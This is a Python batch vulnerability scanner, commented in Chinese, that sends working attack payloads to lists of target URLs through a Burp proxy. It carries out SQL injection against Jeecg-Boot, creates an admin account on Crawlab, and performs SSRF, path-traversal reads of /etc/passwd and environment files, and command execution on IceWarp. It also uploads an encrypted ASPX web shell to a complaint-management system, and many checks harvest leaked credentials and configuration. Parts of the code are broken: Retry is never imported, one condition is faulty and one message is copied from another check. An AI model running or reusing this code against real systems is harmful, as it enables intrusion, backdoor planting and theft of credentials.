import json
import requests
from tqdm import tqdm
import time
import argparse
import hashlib
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib3.exceptions import InsecureRequestWarning
from datetime import datetime
import re


# 忽略 InsecureRequestWarning 警告
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

proxies = { #代理,流量导向burp
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

# 配置重试策略
retry_strategy = Retry(
    total=3,  # 最大重试次数
    status_forcelist=[500, 502, 503, 504],  # 需要重试的HTTP状态码
    allowed_methods=["POST"],  # 仅对POST方法重试
    backoff_factor=1  # 指数退避系数
)

# 定义不同操作系统的测试路径和验证内容,给任意文件读取漏洞准备的
test_cases = [
    {
        "os": "Linux",
        "paths": [
            "/etc/passwd",
            "../../etc/passwd",
            "../../../../etc/passwd",
            "....//etc//passwd",
            "/proc/self/environ",
            "/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd"
        ],
        "keywords": ["root:", "bin/bash"]
    },
    {
        "os": "Windows",
        "paths": [
            "C:\\Windows\\win.ini",
            "..\\..\\Windows\\win.ini",
            "C:/Windows/win.ini",
            "windows\\win.ini",
            "..\\..\\..\\Windows\\win.ini",
            "/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/windows/win.ini"
        ],
        "keywords": ["[extensions]", "[mci extensions]"]
    }
]

def get_current_timestamp():
    """获取当前时间戳"""
    return int(time.time())

def CVE_2023_1454(url, args=1):
    headers = {
        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "*/*",
        "Connection": "close",
        "Content-Type": "application/json"
    }

    body = {
        "apiSelectId": "1316997232402231298",
        "id": "1' or '%1%' like (updatexml(0x3a,concat(1,(select database())),1)) or '%%' like '"
    }
    json_body = json.dumps(body)  # 请求体转换为json格式
    # print(json_body)

    # print(line)
    if not url: #跳过空行
        return
    if url.endswith("/"):
        path = "jeecg-boot/jmreport/qurestSql"
    else:
        path = "/jeecg-boot/jmreport/qurestSql"
    if not url.startswith("https://") and not url.startswith("http://"):
        url = "https://" + url
    payload_url = url + path #例如:http://127.0.0.1/jeecg-boot/jmreport/qurestSql
    # print(payload_url)
    try:
        req = requests.post(payload_url, data=json_body, headers=headers, timeout=5,verify=False, proxies=proxies, allow_redirects=False)
        res = req.text
        if req.status_code == 200 and 'XPATH' in res:
            print("\n"+payload_url+" 存在Jeecg-Boot前台SQL注入漏洞(CVE-2023-1454)！")
            with open("output.txt", "a", encoding='utf-8') as file:
                file.write(payload_url+" 存在Jeecg-Boot前台SQL注入漏洞(CVE-2023-1454)！\n")
            return True
        else:
            #print(payload_url+" 不存在Jeecg-Boot前台SQL注入漏洞(CVE-2023-1454)！")
            return False

    except TimeoutError:
        print(payload_url + "请求超时")
    except Exception as e:
        print(e)



def Crawlab_users(url, args=1):
    # print(urls)
    headers = {
        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "*/*",
        "Connection": "close",
        "Content-Type": "application/json"
    }
    body = {
        "username":"testppp",
        "password":"testppp",
        "role":"admin",
        "email":"testppp@qq.com"
    }
    json_body = json.dumps(body)  # 请求体转换为json格式


    # print(line)
    # print(url)
    if not url: #跳过空行
        return
    if url.endswith("/"):
        path = "api/users"
    else:
        path = "/api/users"
    if not url.startswith("https://") and not url.startswith("http://"):
        url = "https://" + url
    payload_url = url + path #例如:http://127.0.0.1/jeecg-boot/jmreport/qurestSql
    # print(payload_url)
    try:
        req = requests.post(payload_url, data=json_body, headers=headers, timeout=5,proxies=proxies, verify=False, allow_redirects=False)
        res = req.text
        if req.status_code == 200 and ('success' in res):
            print("\n"+payload_url+" 存在Crawlab任意用户添加") #成功的特征
            with open("output.txt", "a", encoding='utf-8') as file:
                file.write(payload_url+" 存在Crawlab任意用户添加漏洞\n")
            return True
        else:
            #print(payload_url+" 不存在任意用户添加！")
            return False

    except TimeoutError:
        print(payload_url + "请求超时")
    except Exception as e:
        print(e)


def Casbin_users(url, args=1):
    if not url: #跳过空行
        return
    if url.endswith("/"):
        path = "api/get-users?p=123&pageSize=123"
    else:
        path = "/api/get-users?p=123&pageSize=123"
    if not url.startswith("https://") and not url.startswith("http://"):
        url = "https://" + url
    payload_url = url + path #例如:http://127.0.0.1/jeecg-boot/jmreport/qurestSql
    # print(payload_url)
    try:
        req = requests.get(payload_url, timeout=5, proxies=proxies, verify=False)
        res = req.text
        if req.status_code == 200 and 'name' in res:
            print("\n"+payload_url+" 存在Casbin get-users 账号密码泄漏漏洞") #成功的特征
            with open("output.txt", "a", encoding='utf-8') as file:
                file.write(payload_url+" 存在Casbin get-users 账号密码泄漏漏洞\n")
            return True
        else:
            #print(payload_url+" 不存在任意用户添加！")
            return False

    except TimeoutError:
        print(payload_url + "请求超时")
    except Exception as e:
        print(e)

def Cerebro_ssrf(url, args=1):
    # print(urls)
    headers = {
        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "*/*",
        "Connection": "close",
        "Content-Type": "application/json"
    }
    body = {
        "method":"GET",
        "data":"",
        "path":"robots.txt",
        "host":"https://www.baidu.com"
    }
    json_body = json.dumps(body)  # 请求体转换为json格式


    # print(line)
    # print(url)
    if not url: #跳过空行
        return
    if url.endswith("/"):
        path = "rest/request"
    else:
        path = "/rest/request"
    if not url.startswith("https://") and not url.startswith("http://"):
        url = "https://" + url
    payload_url = url + path #例如:http://127.0.0.1/jeecg-boot/jmreport/qurestSql
    # print(payload_url)
    try:
        req = requests.post(payload_url, data=json_body, headers=headers, timeout=5, verify=False,proxies=proxies, allow_redirects=False)
        res = req.text
        if req.status_code == 200 and 'www.baidu.com' in res:
            print("\n"+payload_url+" 存在Cerebro_ssrf漏洞") #成功的特征
            with open("output.txt", "a", encoding='utf-8') as file:
                file.write(payload_url+" 存在Cerebro_ssrf漏洞\n")
            return True
        else:
            #print(payload_url+" 不存在任意用户添加！")
            return False

    except TimeoutError:
        print(payload_url + "请求超时")
    except Exception as e:
        print(e)

def XenMobile_read_file(url, args=1):
    if not url: #跳过空行
        return
    if url.endswith("/"):
        path = "jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd"
    else:
        path = "/jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd"
    if not url.startswith("https://") and not url.startswith("http://"):
        url = "https://" + url
    payload_url = url + path #例如:http://127.0.0.1/jeecg-boot/jmreport/qurestSql
    # print(payload_url)
    try:
        req = requests.get(payload_url, timeout=5, proxies=proxies, verify=False)
        res = req.text
        if req.status_code == 200 and 'root' and '/bin/bash' in res:
            print("\n"+payload_url+" 存在XenMobile任意文件读取漏洞") #成功的特征
            with open("output.txt", "a", encoding='utf-8') as file:
                file.write(payload_url+" 存在XenMobile任意文件读取漏洞\n")
            return True
        else:
            #print(payload_url+" 不存在任意用户添加！")
            return False

    except TimeoutError:
        print(payload_url + "请求超时")
    except Exception as e:
        print(e)

def Coremail_inforamation(url, args=1):
    if url.endswith("/"):
        path = "mailsms/s?func=ADMIN:appState&dumpConfig=/"
    else:
        path = "/mailsms/s?func=ADMIN:appState&dumpConfig=/"
    if not url.startswith("https://") and not url.startswith("http://"):
        url = "https://" + url
    payload_url = url + path #例如:http://127.0.0.1/jeecg-boot/jmreport/qurestSql
    # print(payload_url)
    try:
        req = requests.get(payload_url, timeout=5, proxies=proxies, verify=False)
        res = req.text
        if req.status_code != 404 and ('/home/coremail' in res):
            print("\n"+payload_url+" 存在Coremail配置信息泄露漏洞") #成功的特征
            with open("output.txt", "a", encoding='utf-8') as file:
                file.write(payload_url+" 存在Coremail配置信息泄露漏洞\n")
            return True
        else:
            #print(payload_url+" 不存在任意用户添加！")
            return False

    except TimeoutError:
        print(payload_url + "请求超时")
    except Exception as e:
        print(e)

def ICEFlow_VPN_inforamation(url, args=1):
    if url.endswith("/"):
        path = "log/system.log"
    else:
        path = "/log/system.log"
    if not url.startswith("https://") and not url.startswith("http://"):
        url = "https://" + url
    payload_url = url + path #例如:http://127.0.0.1/jeecg-boot/jmreport/qurestSql
    # print(payload_url)
    try:
        req = requests.get(payload_url, timeout=5, proxies=proxies, verify=False)
        res = req.text
        if req.status_code == 200 and ('ICEFLOW' in res):
            print("\n"+payload_url+" 存在ICEFlow_VPN信息泄露漏洞") #成功的特征
            with open("output.txt", "a", encoding='utf-8') as file:
                file.write(payload_url+" 存在ICEFlow_VPN信息泄露漏洞\n")
            return True
        else:
            #print(payload_url+" 不存在任意用户添加！")
            return False

    except TimeoutError:
        print(payload_url + "请求超时")
    except Exception as e:
        print(e)

def KubePi_Noauth(url, args=1):
    # print(urls)
    headers = {
        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "*/*",
        "Connection": "close",
        "Content-Type": "application/json"
    }
    body = {

    }
    json_body = json.dumps(body)  # 请求体转换为json格式


    # print(line)
    # print(url)
    if not url: #跳过空行
        return
    if url.endswith("/"):
        path = "kubepi/api/v1/systems/login/logs/search?pageNum=1&&pageSize=10"
    else:
        path = "/kubepi/api/v1/systems/login/logs/search?pageNum=1&&pageSize=10"
    if not url.startswith("https://") and not url.startswith("http://"):
        url = "https://" + url
    payload_url = url + path #例如:http://127.0.0.1/jeecg-boot/jmreport/qurestSql
    # print(payload_url)
    try:
        req = requests.post(payload_url, data=json_body, headers=headers, timeout=5, verify=False,proxies=proxies, allow_redirects=False)
        res = req.text
        if req.status_code == 200 and '\"success\": true' in res:
            print("\n"+payload_url+" 存在KubePi未授权访问漏洞") #成功的特征
            with open("output.txt", "a", encoding='utf-8') as file:
                file.write(payload_url+" 存在KubePi未授权访问漏洞\n")
            return True
        else:
            #print(payload_url+" 不存在任意用户添加！")
            return False

    except TimeoutError:
        print(payload_url + "请求超时")
    except Exception as e:
        print(e)

def NPS_Noauth(url, args=1):
    def generate_auth_key(timestamp):
        """根据时间戳生成 MD5 值的 auth_key"""
        return hashlib.md5(str(timestamp).encode()).hexdigest()
    # print(urls)
    headers = {
        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "*/*",
        "Connection": "close",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    body = f"search=&order=asc&offset=0&limit=10&auth_key={generate_auth_key(get_current_timestamp())}&timestamp={get_current_timestamp()}"
    #json_body = json.dumps(body)  # 请求体转换为json格式

    # print(line)
    # print(url)
    if not url:  # 跳过空行
        return
    if url.endswith("/"):
        path = "client/list"
    else:
        path = "/client/list"
    if not url.startswith("https://") and not url.startswith("http://"):
        url = "https://" + url
    payload_url = url + path  # 例如:http://127.0.0.1/jeecg-boot/jmreport/qurestSql
    # print(payload_url)
    try:
        req = requests.post(payload_url, data=body, headers=headers, timeout=5, verify=False, proxies=proxies, allow_redirects=False)
        res = req.text
        if req.status_code == 200 and 'bridgePort' in res:
            print("\n" + payload_url + " 存在NPS未授权访问漏洞")  # 成功的特征
            with open("output.txt", "a", encoding='utf-8') as file:
                file.write(payload_url + " 存在NPS未授权访问漏洞\n")
            return True
        else:
            # print(payload_url+" 不存在任意用户添加！")
            return False

    except TimeoutError:
        print(payload_url + "请求超时")
    except Exception as e:
        print(e)

def EEA_Noauth(url, args=1):
    if url.endswith("/"):
        path = "ip/authenticationserverservlet/"
    else:
        path = "/ip/authenticationserverservlet/"
    if not url.startswith("https://") and not url.startswith("http://"):
        url = "https://" + url
    payload_url = url + path #例如:http://127.0.0.1/jeecg-boot/jmreport/qurestSql
    # print(payload_url)
    try:
        req = requests.get(payload_url, timeout=5, proxies=proxies, verify=False)
        res = req.text
        if req.status_code == 200 and ('administratorusername' in res):
            print("\n"+payload_url+" 存在MessageSolution企业邮件归档管理系统EEA信息泄露漏洞") #成功的特征
            with open("output.txt", "a", encoding='utf-8') as file:
                file.write(payload_url+" 存在MessageSolution企业邮件归档管理系统EEA信息泄露漏洞\n")
            return True
        else:
            #print(payload_url+" 不存在任意用户添加！")
            return False

    except TimeoutError:
        print(payload_url + "请求超时")
    except Exception as e:
        print(e)

def CVE_2020_27986(url, args=1):
    if url.endswith("/"):
        path = "api/settings/values"
    else:
        path = "/api/settings/values"
    if not url.startswith("https://") and not url.startswith("http://"):
        url = "https://" + url
    payload_url = url + path #例如:http://127.0.0.1/jeecg-boot/jmreport/qurestSql
    # print(payload_url)
    try:
        req = requests.get(payload_url, timeout=5, proxies=proxies, verify=False)
        res = req.text
        if req.status_code == 200 and ('sonar' in res):
            print("\n"+payload_url+" 存在SonarQube values 信息泄露漏洞 CVE-2020-27986") #成功的特征
            with open("output.txt", "a", encoding='utf-8') as file:
                file.write(payload_url+" 存在SonarQube values 信息泄露漏洞 CVE-2020-27986,可拼接/api/settings/values或者/api/webservices/list查看敏感路径\n")
            return True
        else:
            #print(payload_url+" 不存在任意用户添加！")
            return False

    except TimeoutError:
        print(payload_url + "请求超时")
    except Exception as e:
        print(e)

def SonarQube_projects_Noauth(url, args=1):
    if url.endswith("/"):
        path = "api/components/search_projects"
    else:
        path = "/api/components/search_projects"
    if not url.startswith("https://") and not url.startswith("http://"):
        url = "https://" + url
    payload_url = url + path  # 例如:http://127.0.0.1/jeecg-boot/jmreport/qurestSql
    # print(payload_url)
    try:
        req = requests.get(payload_url, timeout=5, proxies=proxies, verify=False)
        res = req.text
        if req.status_code == 200 and ('components' in res):
            print("\n" + payload_url + " 存在SonarQube search_projects 项目信息泄露漏洞")  # 成功的特征
            with open("output.txt", "a", encoding='utf-8') as file:
                file.write(
                    payload_url + " 存在SonarQube search_projects 项目信息泄露漏洞\n")
            return True
        else:
            # print(payload_url+" 不存在任意用户添加！")
            return False

    except TimeoutError:
        print(payload_url + "请求超时")
    except Exception as e:
        print(e)

def PowerJob_Noauth(url, args=1):
    if url.endswith("/"):
        path = "user/list"
    else:
        path = "/user/list"
    if not url.startswith("https://") and not url.startswith("http://"):
        url = "https://" + url
    payload_url = url + path  # 例如:http://127.0.0.1/jeecg-boot/jmreport/qurestSql
    # print(payload_url)
    try:
        req = requests.get(payload_url, timeout=5, proxies=proxies, verify=False)
        res = req.text
        if req.status_code == 200 and ('\"success\":true' in res):
            print("\n" + payload_url + " 存在PowerJob未授权访问漏洞(CVE-2023-29923)")  # 成功的特征
            with open("output.txt", "a", encoding='utf-8') as file:
                file.write(
                    payload_url + " 存在PowerJob未授权访问漏洞(CVE-2023-29923)\n")
            return True
        else:
            # print(payload_url+" 不存在任意用户添加！")
            return False

    except TimeoutError:
        print(payload_url + "请求超时")
    except Exception as e:
        print(e)

def CVE_2021_3017(url, args=1):
    if not url.startswith("https://") and not url.startswith("http://"):
        url = "https://" + url
    payload_url = url # 例如:http://127.0.0.1/jeecg-boot/jmreport/qurestSql
    # print(payload_url)
    try:
        req = requests.get(payload_url, timeout=5, proxies=proxies, verify=False)
        res = req.text
        if req.status_code == 200 and ('def_wirelesspassword' in res):
            print("\n" + payload_url + " 存在Intelbras-Wireless-未授权与密码泄露-CVE-2021-3017")  # 成功的特征
            with open("output.txt", "a", encoding='utf-8') as file:
                file.write(
                    payload_url + " 存在Intelbras-Wireless-未授权与密码泄露-CVE-2021-3017\n")
            return True
        else:
            # print(payload_url+" 不存在任意用户添加！")
            return False

    except TimeoutError:
        print(payload_url + "请求超时")
    except Exception as e:
        print(e)

def Kyan_Information(url, args=1):
    if not url:
        return
    if url.endswith("/"):
        path = "hosts"
    else:
        path = "/hosts"
    if not url.startswith("https://") and not url.startswith("http://"):
        url = "https://" + url
    payload_url = url + path  # 例如:http://127.0.0.1/jeecg-boot/jmreport/qurestSql
    # print(payload_url)
    try:
        req = requests.get(payload_url, timeout=5, proxies=proxies, verify=False)
        res = req.text
        if req.status_code == 200 and ('UserName' in res):
            print("\n" + payload_url + " 存在Kyan 网络监控设备 hosts 账号密码泄露漏洞")  # 成功的特征
            with open("output.txt", "a", encoding='utf-8') as file:
                file.write(
                    payload_url + " 存在Kyan 网络监控设备 hosts 账号密码泄露漏洞\n")
            return True
        else:
            # print(payload_url+" 不存在任意用户添加！")
            return False

    except TimeoutError:
        print(payload_url + "请求超时")
    except Exception as e:
        print(e)

def ZhangGuanJia_Noauth(url, args=1):
    if not url:
        return
    if url.endswith("/"):
        path = "druid/index.html"
    else:
        path = "/druid/index.html"
    if not url.startswith("https://") and not url.startswith("http://"):
        url = "https://" + url
    payload_url = url + path  # 例如:http://127.0.0.1/jeecg-boot/jmreport/qurestSql
    # print(payload_url)
    try:
        req = requests.get(payload_url, timeout=5, proxies=proxies, verify=False)
        res = req.text
        if req.status_code == 200 and ('Apache Druid' in res):
            print("\n" + payload_url + " 存在章管家druid未授权漏洞")  # 成功的特征
            with open("output.txt", "a", encoding='utf-8') as file:
                file.write(
                    payload_url + " 存在章管家druid未授权漏洞\n")
            return True
        else:
            # print(payload_url+" 不存在任意用户添加！")
            return False

    except TimeoutError:
        print(payload_url + "请求超时")
    except Exception as e:
        print(e)

def IceWarp_WebClient_RCE(url, args=1):
    # print(urls)
    headers = {
        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
        "Accept": "*/*",
        "Cookie": "use_cookie=1",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    body = "_dlg[captcha][target]=system(\\'ipconfig\\')\\"
    #json_body = json.dumps(body)  # 请求体转换为json格式

    # print(line)
    # print(url)
    if not url:  # 跳过空行
        return
    if url.endswith("/"):
        path = "webmail/basic/"
    else:
        path = "/webmail/basic/"
    if not url.startswith("https://") and not url.startswith("http://"):
        url = "https://" + url
    payload_url = url + path  # 例如:http://127.0.0.1/jeecg-boot/jmreport/qurestSql
    # print(payload_url)
    try:
        req = requests.post(payload_url, data=body, headers=headers, timeout=5, proxies=proxies, verify=False, allow_redirects=False)
        res = req.text
        if req.status_code != 404 and ('Gateway' in res):
            print("\n" + payload_url + " 存在IceWarp_WebClient远程命令执行漏洞")  # 成功的特征
            with open("output.txt", "a", encoding='utf-8') as file:
                file.write(payload_url + " 存在IceWarp_WebClient远程命令执行漏洞\n")
            return True
        else:
            # print(payload_url+" 不存在任意用户添加！")
            return False

    except TimeoutError:
        print(payload_url + "请求超时")
    except Exception as e:
        print(e)

def huiwenlibrary_Information(url, args=1):
    if not url:
        return
    if url.endswith("/"):
        path = "include/config.properties"
    else:
        path = "/include/config.properties"
    if not url.startswith("https://") and not url.startswith("http://"):
        url = "https://" + url
    payload_url = url + path  # 例如:http://127.0.0.1/jeecg-boot/jmreport/qurestSql
    # print(payload_url)
    try:
        req = requests.get(payload_url, timeout=5, proxies=proxies, verify=False)
        res = req.text
        if req.status_code == 200 and ('host=' in res):
            print("\n" + payload_url + " 存在汇文 图书馆书目检索系统 config.properties 信息泄漏漏洞")  # 成功的特征
            with open("output.txt", "a", encoding='utf-8') as file:
                file.write(
                    payload_url + " 存在汇文 图书馆书目检索系统 config.properties 信息泄漏漏洞\n")
            return True
        else:
            # print(payload_url+" 不存在任意用户添加！")
            return False

    except TimeoutError:
        print(payload_url + "请求超时")
    except Exception as e:
        print(e)

def 致远OA_员工敏感信息泄露(url, args=1):
    if not url:
        return
    if url.endswith("/"):
        path = "yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0"
    else:
        path = "/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0"
    if not url.startswith("https://") and not url.startswith("http://"):
        url = "https://" + url
    payload_url = url + path  # 例如:http://127.0.0.1/jeecg-boot/jmreport/qurestSql
    # print(payload_url)
    try:
        req = requests.get(payload_url, timeout=5, proxies=proxies, verify=False)
        res = req.content
        if req.status_code == 200 and b"[Content_Types].xml" in res and b"Excel.Sheet" in res:
            print("\n" + payload_url + " 存在致远OA_员工敏感信息泄露漏洞")  # 成功的特征
            with open("output.txt", "a", encoding='utf-8') as file:
                file.write(
                    payload_url + " 存在致远OA_员工敏感信息泄露漏洞\n")
            return True
        else:
            # print(payload_url+" 不存在任意用户添加！")
            return False

    except TimeoutError:
        print(payload_url + "请求超时")
    except Exception as e:
        print(e)

def Go_fastdfs_GetClientIp_Noauth(url, args=1):
    # print(urls)
    headers = {
        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
        "Accept": "*/*",
        "X-Forwarded-For": "127.0.0.1"
        # "Content-Type": "application/x-www-form-urlencoded"
    }
    # body = "_dlg[captcha][target]=system(\\'ipconfig\\')\\"
    # json_body = json.dumps(body)  # 请求体转换为json格式

    # print(line)
    # print(url)
    if not url:  # 跳过空行
        return
    if url.endswith("/"):
        path = "group1/reload?action=get"
    else:
        path = "/group1/reload?action=get"
    if not url.startswith("https://") and not url.startswith("http://"):
        url = "https://" + url
    payload_url = url + path  # 例如:http://127.0.0.1/jeecg-boot/jmreport/qurestSql
    # print(payload_url)
    try:
        req = requests.get(payload_url, headers=headers, timeout=5, proxies=proxies, verify=False)
        res = req.text
        if req.status_code == 200 and ('\"data\": {' in res):
            print("\n" + payload_url + " 存在Go-fastdfs GetClientIp 未授权访问漏洞")  # 成功的特征
            with open("output.txt", "a", encoding='utf-8') as file:
                file.write(payload_url + " 存在Go-fastdfs GetClientIp 未授权访问漏洞\n")
            return True
        else:
            # print(payload_url+" 不存在任意用户添加！")
            return False
    except TimeoutError:
        print(payload_url + "请求超时")
    except Exception as e:
        print(e)

def CMA客诉管理系统_任意文件上传(url, args=1):
    if not url:
        return
    if url.endswith("/"):
        path = "upFile/upFile.ashx"
    else:
        path = "/upFile/upFile.ashx"
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "http://" + url
    payload_url = url + path
    headers = {
        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarymXf9pBIUlDVOYtnZ",
        "Accept-Encoding": "gzip, deflate"
    }
    body = "------WebKitFormBoundarymXf9pBIUlDVOYtnZ\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.aspx\"\nContent-Type: application/octet-stream\n\n<%@ Page Language=\"C#\" %><%@Import Namespace=\"System.Reflection\"%><%Session.Add(\"k\",\"e45e329feb5d925b\");byte[] k = Encoding.Default.GetBytes(Session[0] + \"\"),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance(\"U\").Equals(this);%>\n\n------WebKitFormBoundarymXf9pBIUlDVOYtnZ--"
    try:
        req = requests.post(payload_url, data=body,headers=headers, timeout=5, proxies=proxies, verify=False, allow_redirects=False)
        res = req.text
        if req.status_code == 200 and ('\"path\":\"' in res):
            print("\n" + payload_url + " 存在CMA客诉管理系统 upFile.ashx 任意文件上传漏洞")  # 成功的特征
            with open("output.txt", "a", encoding='utf-8') as file:
                file.write(payload_url + " 存在CMA客诉管理系统 upFile.ashx 任意文件上传漏洞\n")
            return True
        else:
            # print(payload_url+" 不存在任意用户添加！")
            return False
    except TimeoutError:
        print(payload_url + "请求超时")
    except Exception as e:
        print(e)

def 霆智科技_VA虚拟应用平台_任意文件读取漏洞(url, args=1):
    # 定义不同操作系统的测试路径和验证内容,给任意文件读取漏洞准备的
    test_cases = [
        {
            "os": "Linux",
            "paths": [
                "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd"
            ],
            "keywords": ["root:", "bin/bash"]
        },
        {
            "os": "Windows",
            "paths": [
                "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/windows/win.ini"
            ],
            "keywords": ["[extensions]", "[mci extensions]"]
        }
    ]
    if not url:
        return
    for case in test_cases:
        os_type = case["os"]
        for path in case["paths"]:
            try:
                # 构造请求参数
                #params = {param_name: path}
                if url.endswith("/"):
                    path = f"{path}"
                else:
                    path = f"/{path}"
                if not url.startswith("http://") and not url.startswith("https://"):
                    url = "https://" + url
                payload_url = url + path
                # 发送GET请求
                response = requests.get(
                    payload_url,
                    proxies=proxies,
                    timeout=5,
                    verify=False  # 忽略SSL证书验证
                )

                # 检查响应是否有效
                if response.status_code == 200:
                    # 验证内容特征
                    content = response.text
                    for keyword in case["keywords"]:
                        if keyword in content:
                            print(f'\n{payload_url}存在霆智科技_VA虚拟应用平台_任意文件读取漏洞,是{case['os']}系统')  # 成功的特征
                            with open("output.txt", "a", encoding='utf-8') as file:
                                file.write(f'{payload_url}存在霆智科技_VA虚拟应用平台_任意文件读取漏洞,是{case['os']}系统\n')
                            return True
            except TimeoutError:
                print(payload_url + "请求超时")
            except Exception as e:
                print(e)
            # except (requests.exceptions.RequestException, requests.exceptions.Timeout):
                continue
    return False

def CVE_2023_28432(url, args=1):
    headers = {
        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
        "Accept": "*/*",
        "X-Forwarded-For": "127.0.0.1"
        # "Content-Type": "application/x-www-form-urlencoded"
    }

    # print(line)
    # print(url)
    if not url:  # 跳过空行
        return
    if url.endswith("/"):
        path = "minio/bootstrap/v1/verify"
    else:
        path = "/minio/bootstrap/v1/verify"
    if not url.startswith("https://") and not url.startswith("http://"):
        url = "http://" + url
    payload_url = url + path  # 例如:http://127.0.0.1/jeecg-boot/jmreport/qurestSql
    # print(payload_url)
    try:
        req = requests.post(payload_url, headers=headers, timeout=5, proxies=proxies, verify=False)
        res = req.text
        if req.status_code == 200 and (re.search(r'\{"',res)) and (("Minio" in res) or ("Endpoints" in res) or ("DrivesPerSet" in res) or ("MinioEn" in res) or ("User" in res) or ('minio' in res)):
            # data = req.json()
            # 从新版响应体中提取版本字符串
            # version_str = data.get("latest_version", "")
            # if(is_vulnerable_version(version_str)):
            print("\n" + payload_url + " 存在MinIO信息泄露漏洞（CVE-2023-28432）")  # 成功的特征
            with open("output.txt", "a", encoding='utf-8') as file:
                file.write(payload_url + " 存在MinIO信息泄露漏洞（CVE-2023-28432）\n")
            return True
        else:
            # print(payload_url+" 不存在任意用户添加！")
            return False
    except TimeoutError:
        print(payload_url + "请求超时")
    except Exception as e:
        print(e)

def D_Link敏感信息泄露(url, args=1):
        if not url:  # 跳过空行
            return
        if url.endswith("/"):
            path = "config/getuser?index=0"
        else:
            path = "/config/getuser?index=0"
        if not url.startswith("https://") and not url.startswith("http://"):
            url = "https://" + url
        payload_url = url + path  # 例如:http://127.0.0.1/jeecg-boot/jmreport/qurestSql
        # print(payload_url)
        try:
            req = requests.get(payload_url, timeout=5, proxies=proxies, verify=False)
            res = req.text
            if req.status_code == 200 and 'name' in res:
                print("\n" + payload_url + " 存在Casbin get-users 账号密码泄漏漏洞")  # 成功的特征
                with open("output.txt", "a", encoding='utf-8') as file:
                    file.write(payload_url + " 存在Casbin get-users 账号密码泄漏漏洞\n")
                return True
            else:
                # print(payload_url+" 不存在任意用户添加！")
                return False

        except TimeoutError:
            print(payload_url + "请求超时")
        except Exception as e:
            print(e)